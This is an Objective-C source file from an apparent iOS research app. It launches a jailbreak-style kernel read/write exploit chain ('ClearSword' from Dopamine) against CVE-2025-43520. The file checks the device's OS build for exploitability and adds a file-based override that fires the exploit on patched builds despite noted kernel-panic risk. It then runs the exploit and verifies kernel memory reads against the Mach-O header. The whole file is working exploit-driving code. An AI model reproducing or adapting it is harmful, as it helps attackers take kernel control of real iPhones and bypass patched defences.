#import "CS2Runner.h"
#import "LabRuntimeOffsets.h"
#import "LabDeviceProfile.h"

// cs2 core (verbatim upstream, prefixed)
#include "cs2/poc.h"   // cs2_run, cs2_pe*, cs2_context_t/cs2_ctx
#include "cs2/krw.h"   // cs2_kreadbuf / cs2_kwritebuf

#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <sys/sysctl.h>
#include <time.h>
#include <unistd.h>

// lab deadline infra consumed by cs2/common.h cs2_expired()
volatile int cs2_stop = 0;
volatile time_t cs2_deadline = 0;

static int g_cs2_log_fd = -1;
static BOOL g_cs2_running = NO;

#define CS2_TIME_BUDGET_SEC 300

void cs2_log(const char *fmt, ...) {
    char buf[2048];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    fprintf(stderr, "%s\n", buf);
    if (g_cs2_log_fd >= 0) {
        ssize_t r1 = write(g_cs2_log_fd, buf, strlen(buf));
        ssize_t r2 = write(g_cs2_log_fd, "\n", 1);
        (void)r1; (void)r2;
        fcntl(g_cs2_log_fd, F_FULLFSYNC);
    }
}

static NSString *cs2_sysctl_string(NSString *name) {
    char buf[256];
    size_t len = sizeof(buf);
    if (sysctlbyname([name UTF8String], buf, &len, NULL, 0) == 0) {
        return [NSString stringWithUTF8String:buf];
    }
    return @"?";
}

/* CVE-2025-43520 viability gate (patched 18.7.2 / 26.1).
   Same rule as Lum1na project Lum1naCS2Core.m cs2_cve43520_viable().
   <= 21 (16.x/17.x) = pre-patch VIABLE; 22A-22G (18.0-18.6.x) VIABLE;
   23A (26.0.x) VIABLE; anything 23B+ = PATCHED — hop-1 cluster_*_contig
   returns EINVAL and firing the spray only starves configd (A12X_23G71
   watchdog panic 2026-10-20 21:59, panic-full-2026-10-20-215932.ips). */
static BOOL cs2_cve43520_viable(void) {
    const char *v = cs2_sysctl_string(@"kern.osversion").UTF8String;
    if (!v || strlen(v) < 3) return NO;
    int major = 0, rev = 0;
    char train = 0;
    if (sscanf(v, "%2d%c%d", &major, &train, &rev) < 2) return NO;
    if (major <= 21) return YES;
    if (major == 22) return (train >= 'A' && train <= 'G');
    if (major == 23) return (train == 'A');
    return NO;
}

static void cs2_write_banner(void) {
    NSString *mach = cs2_sysctl_string(@"hw.machine");
    NSString *osv = cs2_sysctl_string(@"kern.osversion");
    const LabOffTab *off = LabOff();
    cs2_log("time %s", [[[NSDate date] description] UTF8String]);
    cs2_log("=== cs2 session BUILD cs2-verbatim-v2-honest ===");
    cs2_log("core: Dopamine 3.0.11 ClearSword exploit/ verbatim (opa334)");
    cs2_log("machine=%s osversion=%s sku=%s",
            mach.UTF8String ?: "?", osv.UTF8String ?: "?",
            (off && off->tag) ? off->tag : "NULL");
    cs2_log("ladder: socket_usecount=0x%x static_base=0x%llx (LabOff runtime table)",
            off ? off->socket_usecount : 0,
            (unsigned long long)(off ? off->static_base : 0));
    cs2_log("HONESTY: hop-1 cluster_*_contig EINVAL since 26.1. phys_oob READ scan with kbase=0 is setup, not KRW.");
    cs2_log("HONESTY: Probe app fires on every SKU. Public Lum1na SKIPS CS2 as first KRW on T8150/unknown.");
    cs2_log("budget: %d s. Panic = reboot; recovered log shows last step.", CS2_TIME_BUDGET_SEC);
    cs2_log("expect: 22528-socket spray -> pc mapping -> 8x128MiB mlocked scan");
    cs2_log("        -> pcb_start_offset / target corrupted -> kernel_base / kernel_slide");
}

/* LightSword arm license (2026-10-24): the LightSword calib has PROVEN the
   phys_oob copy confusion on trains the CVE-2025-43520 gate refuses —
   24A435/27.0: 4 WRONG crossings (0xba0000 recurring across boots,
   0x57c0000/0x6840000/0x7ee0000) with zero configd starvation across a dozen
   400k-900k-socket sprays. An arm file (Documents/lswkrw_arm.txt) + a calib
   hot set (>=4 windows) licenses this ladder on a patched train. Panic
   possible; one tap per fresh boot; ladder prints are the dial-finder. */
/* LightSword arm license (2026-10-24): the LightSword calib has PROVEN the
   phys_oob copy confusion on trains the CVE-2025-43520 gate refuses —
   24A435/27.0: 5 WRONG crossings over distinct boots (0xba0000, 0x57c0000 x3
   same foreign page-id, 0x6840000, 0x7ee0000) with zero configd starvation
   across a dozen 400k-900k-socket sprays. Two arm shapes:
     - AUTO-LICENSE: calib hot set >= 8 windows on THIS device (no toggle).
     - EXPLICIT: Documents/lswkrw_arm.txt present (lswarm toggle) + >= 1 window.
   Panic possible; one tap per fresh boot; ladder prints are the dial-finder. */
static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
    *windows = 0;
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    *explicit_arm = [NSFileManager.defaultManager fileExistsAtPath:
                        [docs stringByAppendingPathComponent:@"lswkrw_arm.txt"]];
    NSString *hot = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"lightsword_hot.txt"]
                                              encoding:NSUTF8StringEncoding error:nil];
    if (!hot) hot = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"racecalib_hot.txt"]
                                              encoding:NSUTF8StringEncoding error:nil];
    __block int n = 0;
    if (hot.length) {
        [[hot componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]
            enumerateObjectsUsingBlock:^(NSString *line, NSUInteger idx, BOOL *stop) {
                if (line.length >= 2 && [line hasPrefix:@"0x"]) n++;
            }];
    }
    *windows = n;
    if (*explicit_arm) return n >= 1;
    return n >= 8;
}

@implementation CS2Runner

+ (NSString *)runUpstream {
    if (g_cs2_running) {
        return @"cs2 already running (one tap per force-quit)";
    }
    g_cs2_running = YES;

    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"cs2_krw_log.txt"];
    g_cs2_log_fd = open([lp UTF8String], O_WRONLY | O_CREAT | O_TRUNC, 0644);

    cs2_write_banner();

    if (!cs2_cve43520_viable()) {
        BOOL explicitArm = NO;
        int wins = 0;
        if (lsword_arm_licensed(&wins, &explicitArm)) {
            cs2_log("[LSWORD-ARM] %s: %d calib hot windows on this device.",
                    explicitArm ? "explicit arm file (lswkrw_arm.txt)"
                                : "auto-license (calib hot set >= 8 on this device)",
                    wins);
            cs2_log("[LSWORD-ARM] phys_oob copy confusion PROVEN on this train (calib WRONG crossings;");
            cs2_log("[LSWORD-ARM] zero configd starvation across a dozen 400k-900k socket sprays).");
            cs2_log("[LSWORD-ARM] Firing the cs2 ladder anyway — hop-1 cluster_*_contig may EINVAL;");
            cs2_log("[LSWORD-ARM] the pcb scan / copy / corrupt stages are this calib's proven class.");
            cs2_log("[LSWORD-ARM] PANIC POSSIBLE — one tap per fresh boot. Ladder prints = dial-finder.");
        } else {
            cs2_log("[-] SKIP: CVE-2025-43520 patched on this build train (18.7.2/26.1+), no LightSword license.");
            cs2_log("[-] auto-license needs a calib hot set >= 8 on THIS device (tap cscali once or twice).");
            cs2_log("[*] lswarm toggle = explicit override (any hot set >= 1). Fresh boot before cs2.");
            if (g_cs2_log_fd >= 0) { close(g_cs2_log_fd); g_cs2_log_fd = -1; }
            g_cs2_running = NO;
            return @"cs2 SKIP (patched train, unlicensed) — run cscali 1-2x here, or lswarm override.";
        }
    }

    cs2_stop = 0;
    cs2_deadline = time(NULL) + CS2_TIME_BUDGET_SEC;

    int ret = cs2_run();
    cs2_stop = 1;

    NSMutableString *out = [NSMutableString string];
    if (ret == 0 && cs2_ctx.kernel_base != 0) {
        // self-test: MH magic at kernel_base (read-only, no kernel writes)
        uint64_t hdr = 0;
        cs2_kreadbuf(cs2_ctx.kernel_base, &hdr, sizeof(hdr));
        BOOL magic_ok = (hdr == 0x100000cfeedfacf);
        uint8_t dump[32];
        memset(dump, 0, sizeof(dump));
        cs2_kreadbuf(cs2_ctx.kernel_base, dump, sizeof(dump));
        NSMutableString *hx = [NSMutableString string];
        for (int i = 0; i < 32; i++) [hx appendFormat:@"%02x ", dump[i]];

        cs2_log("=== KRW SELF-TEST ===");
        cs2_log("kernel_base=0x%llx kernel_slide=0x%llx", (unsigned long long)cs2_ctx.kernel_base, (unsigned long long)cs2_ctx.kernel_slide);
        /* board law (note 143 cross-ref): magic alone is not the gate — the
           typeinfo triple-check is. kread64(kbase+8) must be one of
           {0x200000000, 0xc00000002, 0xcc00000002}. */
        uint64_t typeinfo = 0;
        cs2_kreadbuf(cs2_ctx.kernel_base + 8, &typeinfo, sizeof(typeinfo));
        BOOL typeinfo_ok = (typeinfo == 0x200000000 || typeinfo == 0xc00000002 || typeinfo == 0xcc00000002);
        cs2_log("kread64@kbase+8=0x%llx typeinfo %s", (unsigned long long)typeinfo, typeinfo_ok ? "PASS" : "FAIL");
        cs2_log("kread8@kbase=0x%llx magic 0x100000cfeedfacf: %s",
                (unsigned long long)hdr, magic_ok ? "PASS" : "FAIL");
        cs2_log("dump[0..31]= %s", hx.UTF8String ?: "");
        if (!magic_ok) {
            cs2_log("HONESTY: magic mismatch => kread NOT confirmed; hasKread stays NO.");
            ret = -2;
        }
    } else {
        cs2_log("=== cs2 run FAILED ret=%d (see steps above; log: %s) ===",
                ret, lp.lastPathComponent.UTF8String ?: "cs2_krw_log.txt");
        cs2_log("HONESTY: no kernel_base => no KRW claim. hasKread stays NO.");
    }

    [out appendFormat:@"cs2 ret=%d", ret];
    if (ret == 0) {
        [out appendFormat:@" kbase=0x%llx slide=0x%llx", (unsigned long long)cs2_ctx.kernel_base, (unsigned long long)cs2_ctx.kernel_slide];
    }
    [out appendFormat:@" log=%@", [lp lastPathComponent]];

    if (g_cs2_log_fd >= 0) {
        close(g_cs2_log_fd);
        g_cs2_log_fd = -1;
    }
    g_cs2_running = NO;
    return out;
}

@end